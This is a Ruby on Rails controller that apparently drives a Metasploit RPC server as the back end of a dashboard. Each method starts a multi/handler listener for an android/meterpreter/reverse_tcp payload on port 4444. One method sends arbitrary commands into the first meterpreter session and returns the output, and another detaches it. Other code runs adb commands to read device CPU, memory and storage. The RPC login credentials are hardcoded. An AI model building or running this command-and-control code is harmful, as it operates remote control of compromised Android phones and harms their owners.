class ApplicationController < ActionController::Base
  @@isAdbConnected=false
  @@isMsfConnected=false
  @@cpuUsage=0
  @@memoryUsage=0
  @@storage=0
  @@nrFinishedProcesses=0
  @@nrRunningProcesses=20

    def start_msf_process(command)
        require 'msfrpc-client'
        require 'date'
        user = 'cool'
        password = 'looc'
        options = {
          host: '127.0.0.1',
          port: 3333,
          uri:  '/api/',
          ssl:  true
        }
        rpc = Msf::RPC::Client.new(options)
        rpc.login(user, password)
        payloadOptions = {
          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
          'LHOST'   => '0.0.0.0',
          'LPORT'   => 4444
        }
        job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
        session=rpc.call('session.list').keys[0]

        puts rpc.call('session.meterpreter_write', session, command)
        sleep 4
        commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
        return commandOutput
    end

    def detach_session
        require 'msfrpc-client'
        require 'date'
        user = 'cool'
        password = 'looc'
        options = {
          host: '127.0.0.1',
          port: 3333,
          uri:  '/api/',
          ssl:  true
        }
        rpc = Msf::RPC::Client.new(options)
        rpc.login(user, password)
        payloadOptions = {
          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
          'LHOST'   => '0.0.0.0',
          'LPORT'   => 4444
        }
        job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
        session=rpc.call('session.list').keys[0]

        puts rpc.call('session.meterpreter_session_detach', session)
        sleep 4
        commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
        return commandOutput

    end


    def check_connection
      @@nrFinishedProcesses+=1
      @@nrRunningProcesses-=2
      
      adbDevices=`tools\\platform-tools\\adb.exe devices`.split("\n")
      @@isAdbConnected=false
      @@cpuUsage = @@memoryUsage = @@storage = 0
      if adbDevices.size > 1
        @@isAdbConnected=true
        memoryTotal=`tools\\platform-tools\\adb.exe shell "cat /proc/meminfo | grep MemTotal"`.strip.gsub(/\D/, '').to_f
        memoryAvailable=`tools\\platform-tools\\adb.exe shell "cat /proc/meminfo | grep MemAvailable"`.strip.gsub(/\D/, '').to_f
        @@memoryUsage=((memoryTotal- memoryAvailable)/memoryTotal * 100).to_i
        #puts @@memoryUsage
        #cpuFields=`tools\\platform-tools\\adb.exe shell "cat /proc/stat | grep 'cpu '"`.strip.split

        cpuOutput=`tools\\platform-tools\\adb.exe shell "top -n 1 | grep User | grep %"`
        userCPU=/User (.*)%, System/.match(cpuOutput).captures[0].to_i
        systemCPU=/System (.*)%, IOW/.match(cpuOutput).captures[0].to_i
        @@cpuUsage=userCPU + systemCPU
        puts @@cpuUsage

        totalMemory=`tools\\platform-tools\\adb.exe shell "df /storage/emulated | tail -n +2"`.strip.split[1].gsub(/[^\d\.]/, '').to_f
        usedMemory=`tools\\platform-tools\\adb.exe shell "df /storage/emulated | tail -n +2"`.strip.split[2].gsub(/[^\d\.]/, '').to_f
      end

      msfConnected=false
      begin


            require 'msfrpc-client'
            require 'date'
            user = 'cool'
            password = 'looc'
            options = {
              host: '127.0.0.1',
              port: 3333,
              uri:  '/api/',
              ssl:  true
            }
            rpc = Msf::RPC::Client.new(options)
            rpc.login(user, password)
            payloadOptions = {
              'PAYLOAD' => 'android/meterpreter/reverse_tcp',
              'LHOST'   => '0.0.0.0',
              'LPORT'   => 4444
            }
            job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
            sessions=rpc.call('session.list')
            @@isMsfConnected=sessions.size > 0 ? true : false
      rescue Msf::RPC::ServerException => e
            puts e
            puts "Docker MSF Container is Down"
      end
      respond_to do |format|
        format.js { render "check_connection", :locals => {:adbConnected => @@isAdbConnected,
                   :msfConnected => @@isMsfConnected, :cpuUsage => @@cpuUsage, :memoryUsage => @@memoryUsage,
                   :nrRunningProcesses => @@nrRunningProcesses, :nrFinishedProcesses => @@nrFinishedProcesses }  }
      end

    end
end
